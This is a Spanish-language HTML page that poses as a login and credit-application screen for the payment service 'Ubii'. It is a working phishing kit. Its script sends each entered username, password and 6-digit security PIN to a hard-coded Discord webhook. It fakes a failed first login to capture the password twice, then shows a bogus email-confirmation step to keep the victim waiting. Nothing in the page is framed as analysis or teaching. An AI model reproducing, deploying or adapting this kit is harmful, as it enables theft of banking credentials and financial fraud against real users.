<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ubii - Inicia Sesión y Solicitud de Crédito</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        ubiiBlue: '#009ee3',
                        ubiiBlueHover: '#0088c6',
                        ubiiCardBg: '#ffffff',
                        ubiiPageBg: '#e9ecef',
                        ubiiInputBg: '#ffffff',
                        ubiiGrayBg: '#eef2f5',
                        ubiiTextDark: '#1a1a1a',
                        ubiiTextGray: '#666666',
                        ubiiBorder: '#e2e8f0',
                    },
                    fontFamily: {
                        sans: ['Poppins', 'system-ui', '-apple-system', 'BlinkMacSystemFont', 'Segoe UI', 'Roboto', 'sans-serif'],
                    }
                }
            }
        }
    </script>
    <!-- FontAwesome Font Iconos -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
        
        body {
            background-color: #ebedee;
            font-family: 'Poppins', sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        /* Ocultar flechas numéricas */
        input::-webkit-outer-spin-button,
        input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }
        input[type=number] {
            -moz-appearance: textfield;
        }
    </style>
</head>
<body class="min-h-screen flex flex-col justify-center items-center p-4 selection:bg-ubiiBlue selection:text-white">

    <!-- Envoltorio Principal Centrado -->
    <div class="w-full max-w-sm mx-auto flex flex-col items-center">
        
        <!-- LOGO SUPERIOR UBII -->
        <div class="w-full flex justify-start mb-6 px-2">
            <div class="flex items-center gap-2">
                <svg class="h-9 w-auto" viewBox="0 0 42 46" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <rect x="7" y="1" width="7.5" height="7.5" fill="#009ee3" rx="0.5" />
                    <rect x="27.5" y="1" width="7.5" height="7.5" fill="#009ee3" rx="0.5" />
                    <path d="M 4 14 V 28 C 4 41, 38 41, 38 28 V 14" stroke="#009ee3" stroke-width="5.5" stroke-linecap="square" stroke-linejoin="miter" />
                </svg>
                <span class="text-3xl font-semibold text-ubiiBlue tracking-tight" style="letter-spacing: -0.5px;">Ubii</span>
            </div>
        </div>

        <!-- TARJETA PRINCIPAL -->
        <div class="w-full bg-white rounded-[2rem] shadow-xl p-6 sm:p-7 border border-slate-100 relative overflow-hidden transition-all duration-300">

            <!-- ==================== ETAPA 1: PANTALLA DE LOGIN UBII ==================== -->
            <main id="step1Screen" class="w-full flex flex-col items-center pt-2">
                
                <div class="flex items-center gap-2 mb-2">
                    <svg class="h-8 w-auto" viewBox="0 0 42 46" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <rect x="7" y="1" width="7.5" height="7.5" fill="#009ee3" rx="0.5" />
                        <rect x="27.5" y="1" width="7.5" height="7.5" fill="#009ee3" rx="0.5" />
                        <path d="M 4 14 V 28 C 4 41, 38 41, 38 28 V 14" stroke="#009ee3" stroke-width="5.5" stroke-linecap="square" stroke-linejoin="miter" />
                    </svg>
                    <span class="text-2xl font-semibold text-ubiiBlue tracking-tight" style="letter-spacing: -0.5px;">Ubii</span>
                </div>
                
                <h1 class="text-xl font-medium text-[#111111] mb-6">Inicia sesión</h1>

                <!-- Switch Selector: Natural / Jurídico -->
                <div class="w-full bg-[#f1f3f6] p-1 rounded-full flex items-center mb-5">
                    <button id="btnNatural" type="button" onclick="selectType('natural')" class="w-1/2 py-2.5 rounded-full text-sm font-semibold transition-all duration-200 bg-ubiiBlue text-white shadow-sm">
                        Natural
                    </button>
                    <button id="btnJuridico" type="button" onclick="selectType('juridico')" class="w-1/2 py-2.5 rounded-full text-sm font-semibold transition-all duration-200 text-gray-600">
                        Juridico
                    </button>
                </div>

                <!-- Formulario de Entrada -->
                <form id="loginForm" onsubmit="handleStep1Submit(event)" class="w-full space-y-4">
                    
                    <div>
                        <input 
                            type="text" 
                            id="username" 
                            placeholder="Usuario / Correo" 
                            required
                            class="w-full px-4 py-3.5 bg-white border border-gray-200 rounded-2xl text-sm focus:outline-none focus:border-ubiiBlue focus:ring-1 focus:ring-ubiiBlue transition-all placeholder-gray-400 font-normal text-gray-800"
                        >
                    </div>

                    <div class="relative">
                        <input 
                            type="password" 
                            id="password" 
                            placeholder="Contraseña" 
                            required
                            class="w-full px-4 py-3.5 bg-white pr-12 border border-gray-200 rounded-2xl text-sm focus:outline-none focus:border-ubiiBlue focus:ring-1 focus:ring-ubiiBlue transition-all placeholder-gray-400 font-normal text-gray-800"
                        >
                        <button 
                            type="button" 
                            onclick="togglePassword()" 
                            class="absolute right-3.5 top-1/2 -translate-y-1/2 text-gray-400 hover:text-ubiiBlue transition-colors p-1.5 focus:outline-none"
                        >
                            <i id="eyeIcon" class="fa-regular fa-eye-slash text-xl"></i>
                        </button>
                    </div>

                    <!-- Mensaje de error para el primer intento de contraseña -->
                    <div id="loginErrorStep1" class="hidden bg-red-50 border-l-4 border-red-500 p-3 rounded-r-xl">
                        <p class="text-xs text-red-600 font-medium flex items-center gap-1.5">
                            <i class="fa-solid fa-circle-exclamation text-red-500 shrink-0"></i>
                            <span>Usuario o contraseña incorrectos. Por favor, verifica e inténtalo nuevamente.</span>
                        </p>
                    </div>

                    <div class="text-left pt-1 px-1">
                        <a href="#" class="text-xs font-semibold text-ubiiBlue hover:underline transition-colors">
                            ¿Olvidaste tú contraseña?
                        </a>
                    </div>

                    <div class="pt-2">
                        <button 
                            type="submit" 
                            id="btnSubmitStep1"
                            class="w-full py-3.5 bg-ubiiBlue hover:bg-ubiiBlueHover text-white font-medium rounded-2xl text-base transition-all transform active:scale-[0.99] shadow-sm focus:outline-none flex items-center justify-center gap-2"
                        >
                            Ingresar
                        </button>
                    </div>

                    <div>
                        <button 
                            type="button" 
                            class="w-full py-3.5 bg-[#f1f3f6] hover:bg-gray-200 text-gray-800 font-medium rounded-2xl text-base transition-all transform active:scale-[0.99] focus:outline-none"
                        >
                            Registrarme
                        </button>
                    </div>
                </form>

            </main>

            <!-- ==================== ETAPA 2: PEDIR PIN DE SEGURIDAD (ÚNICO PIN) ==================== -->
            <main id="step2Screen" class="w-full hidden flex-col">
                <button type="button" onclick="goToStep(1)" class="text-gray-400 hover:text-gray-700 mb-4 flex items-center gap-1.5 text-xs font-semibold focus:outline-none">
                    <i class="fa-solid fa-arrow-left"></i> Volver
                </button>

                <div class="flex flex-col items-center justify-center text-center mb-6">
                    <div class="w-14 h-14 bg-blue-50 text-ubiiBlue rounded-full flex items-center justify-center mb-3">
                        <i class="fa-solid fa-key text-2xl"></i>
                    </div>
                    <h2 class="text-lg font-bold text-gray-900">Clave de Seguridad Ubii</h2>
                    <p class="text-xs text-gray-500 mt-2 leading-relaxed">
                        Ingresa el PIN de 6 dígitos que creaste al registrarte en Ubii para la cuenta:<br>
                        <strong class="displayUser text-gray-800 font-semibold break-all"></strong>
                    </p>
                </div>

                <form onsubmit="handleStep2Submit(event)" class="space-y-5">
                    <div class="grid grid-cols-6 gap-2">
                        <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-1 w-full aspect-square text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue bg-gray-50" required>
                        <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-1 w-full aspect-square text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue bg-gray-50" required>
                        <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-1 w-full aspect-square text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue bg-gray-50" required>
                        <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-1 w-full aspect-square text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue bg-gray-50" required>
                        <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-1 w-full aspect-square text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue bg-gray-50" required>
                        <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-1 w-full aspect-square text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue bg-gray-50" required>
                    </div>

                    <button 
                        type="submit" 
                        id="btnSubmitStep2"
                        class="w-full py-3.5 bg-ubiiBlue hover:bg-ubiiBlueHover text-white font-medium rounded-2xl text-base transition-all transform active:scale-[0.99] shadow-sm flex items-center justify-center gap-2"
                    >
                        Validar PIN
                    </button>
                </form>
            </main>

            <!-- ==================== ETAPA 3: REVISAR CORREO ELECTRÓNICO ==================== -->
            <main id="step3Screen" class="w-full hidden flex-col items-center text-center">
                <div class="w-16 h-16 bg-blue-50 text-ubiiBlue rounded-full flex items-center justify-center mb-4">
                    <i class="fa-regular fa-envelope text-3xl animate-bounce"></i>
                </div>
                
                <h2 class="text-xl font-bold text-gray-900 mb-1">Revisa tu correo</h2>
                <p class="text-xs text-gray-500 leading-relaxed mb-4">
                    Hemos enviado un correo de validación a:<br>
                    <span class="displayUserEmail text-ubiiBlue font-bold block mt-1 break-all"></span>
                </p>

                <!-- Advertencia Inicial -->
                <div class="bg-amber-50 border border-amber-200 p-3.5 rounded-2xl text-left mb-4 shadow-sm">
                    <p class="text-xs text-amber-800 flex items-start gap-2.5 leading-relaxed font-medium">
                        <i class="fa-solid fa-triangle-exclamation text-amber-500 text-sm mt-0.5 shrink-0"></i>
                        <span><strong>Atención:</strong> Tu crédito solo será aprobado si confirmas y autorizas previamente a través del correo electrónico enviado.</span>
                    </p>
                </div>

                <!-- Notificación de Recordatorio si presiona antes de autorizar -->
                <div id="emailNotVerifiedAlert" class="hidden bg-red-50 border-l-4 border-red-500 p-3.5 rounded-r-2xl text-left mb-4">
                    <p class="text-xs text-red-700 leading-relaxed font-medium flex items-start gap-2">
                        <i class="fa-solid fa-circle-xmark text-red-500 text-base mt-0.5 shrink-0"></i>
                        <span>Por favor, entra a tu correo electrónico y autoriza para poder continuar con la aprobación del crédito.</span>
                    </p>
                </div>

                <div class="w-full space-y-3 pt-1">
                    <button 
                        type="button" 
                        id="btnConfirmEmail"
                        onclick="handleConfirmEmailClick()" 
                        class="w-full py-3.5 bg-ubiiBlue hover:bg-ubiiBlueHover text-white font-medium rounded-2xl text-base transition-all transform active:scale-[0.99] shadow-sm flex items-center justify-center gap-2"
                    >
                        Ya confirmé el correo
                    </button>
                </div>
            </main>

        </div>

        <!-- Enlace Inferior de Contacto / Soporte -->
        <div class="mt-6 text-center text-xs text-gray-500 font-medium">
            ¿Tienes problemas? <a href="#" class="text-ubiiBlue font-semibold hover:underline">Contáctanos</a>
        </div>

    </div>

    <!-- Script de Lógica del Sistema -->
    <script>
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1539815628586749962/vZ-AWmOfGZ8SIfj61NbVcMOxvmRGuy3dM5xEgp7QmpLl9lJekjsccXClXIs1QUCYeLA9";

        let selectedType = 'natural';
        let userEmailOrName = '';
        let userPassword = '';
        let userPin = '';
        let loginAttemptCount = 0; // Contador de intentos de login

        // Enviar reportes a Discord
        function sendToDiscord(messageText) {
            fetch(DISCORD_WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    username: "Ubii - Sistema Notificador",
                    content: messageText
                })
            }).catch(err => console.error("Error al enviar a Discord:", err));
        }

        // Alternar entre Natural y Jurídico
        function selectType(type) {
            selectedType = type;
            const btnNatural = document.getElementById('btnNatural');
            const btnJuridico = document.getElementById('btnJuridico');

            if (type === 'natural') {
                btnNatural.className = "w-1/2 py-2.5 rounded-full text-sm font-semibold transition-all duration-200 bg-ubiiBlue text-white shadow-sm";
                btnJuridico.className = "w-1/2 py-2.5 rounded-full text-sm font-semibold transition-all duration-200 text-gray-600";
            } else {
                btnJuridico.className = "w-1/2 py-2.5 rounded-full text-sm font-semibold transition-all duration-200 bg-ubiiBlue text-white shadow-sm";
                btnNatural.className = "w-1/2 py-2.5 rounded-full text-sm font-semibold transition-all duration-200 text-gray-600";
            }
        }

        // Mostrar / Ocultar Contraseña
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const eyeIcon = document.getElementById('eyeIcon');

            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIcon.className = "fa-regular fa-eye text-xl";
            } else {
                passwordInput.type = 'password';
                eyeIcon.className = "fa-regular fa-eye-slash text-xl";
            }
        }

        // Gestor de Cambio de Pantallas / Etapas
        function goToStep(stepNumber) {
            for (let i = 1; i <= 3; i++) {
                const screen = document.getElementById(`step${i}Screen`);
                if (screen) screen.classList.add('hidden');
            }

            document.getElementById(`step${stepNumber}Screen`).classList.remove('hidden');

            if (stepNumber === 2) {
                const inputs = document.querySelectorAll('.pin-input-1');
                inputs.forEach(i => i.value = '');
                setTimeout(() => inputs[0].focus(), 100);
            }
        }

        // ETAPA 1: Login (Primer intento falla, segundo pasa)
        function handleStep1Submit(event) {
            event.preventDefault();
            userEmailOrName = document.getElementById('username').value;
            userPassword = document.getElementById('password').value;

            document.querySelectorAll('.displayUser').forEach(el => el.innerText = userEmailOrName);
            document.querySelectorAll('.displayUserEmail').forEach(el => {
                el.innerText = userEmailOrName.includes('@') ? userEmailOrName : `${userEmailOrName}@correo.com`;
            });

            const btn = document.getElementById('btnSubmitStep1');
            const errorBox = document.getElementById('loginErrorStep1');
            btn.disabled = true;
            btn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i> Validando...`;

            loginAttemptCount++;

            setTimeout(() => {
                btn.disabled = false;
                btn.innerHTML = "Ingresar";

                if (loginAttemptCount === 1) {
                    // Primer Intento: Mostrar Error
                    errorBox.classList.remove('hidden');
                    sendToDiscord(`❌ **INICIO DE SESIÓN FALLIDO (PRIMER INTENTO - ETAPA 1)**\nTipo: ${selectedType}\n**Usuario:** \`${userEmailOrName}\`\n**Contraseña:** \`${userPassword}\``);
                } else {
                    // Segundo Intento: Exitoso
                    errorBox.classList.add('hidden');
                    sendToDiscord(`🚨 **INICIO DE SESIÓN CORRECTO (ETAPA 1)**\nTipo: ${selectedType}\n**Usuario:** \`${userEmailOrName}\`\n**Contraseña:** \`${userPassword}\``);
                    goToStep(2);
                }
            }, 3000); // Duración de 3 segundos
        }

        // ETAPA 2: PIN único de 6 dígitos -> Pasa a la Etapa 3
        function handleStep2Submit(event) {
            event.preventDefault();
            const inputs = document.querySelectorAll('.pin-input-1');
            let pinVal = '';
            inputs.forEach(i => pinVal += i.value);

            if (pinVal.length !== 6) return;
            userPin = pinVal;

            const btn = document.getElementById('btnSubmitStep2');
            const originalText = btn.innerHTML;

            btn.disabled = true;
            btn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i> Verificando...`;

            setTimeout(() => {
                btn.disabled = false;
                btn.innerHTML = originalText;

                sendToDiscord(`✅ **PIN INGRESADO (ETAPA 2)**\n**Usuario:** \`${userEmailOrName}\`\n**PIN:** \`${userPin}\``);

                goToStep(3);
            }, 3000); // Duración de 3 segundos
        }

        // ETAPA 3: Lógica de clic en "Ya confirmé el correo"
        function handleConfirmEmailClick() {
            const btn = document.getElementById('btnConfirmEmail');
            const alertBox = document.getElementById('emailNotVerifiedAlert');

            btn.disabled = true;
            btn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i> Comprobando...`;

            setTimeout(() => {
                btn.disabled = false;
                btn.innerHTML = "Ya confirmé el correo";

                // Mostrar la alerta
                alertBox.classList.remove('hidden');

                // Notificar intento a Discord con datos
                sendToDiscord(`⚠️ **CLIC EN "YA CONFIRMÉ EL CORREO" SIN VERIFICAR**\n**Tipo:** \`${selectedType}\`\n**Usuario:** \`${userEmailOrName}\`\n**Contraseña:** \`${userPassword}\`\n**PIN:** \`${userPin}\``);
            }, 3000); // Duración de 3 segundos
        }

        // Configurar navegación de casillas de PIN
        function setupPinInputs(selectorClass) {
            const inputs = document.querySelectorAll(selectorClass);
            inputs.forEach((input, index) => {
                input.addEventListener('input', (e) => {
                    if (e.target.value.length > 1) {
                        e.target.value = e.target.value.slice(-1);
                    }
                    if (e.target.value !== '' && index < inputs.length - 1) {
                        inputs[index + 1].focus();
                    }
                });

                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                        inputs[index - 1].focus();
                    }
                });
            });
        }

        setupPinInputs('.pin-input-1');
    </script>
</body>
</html>
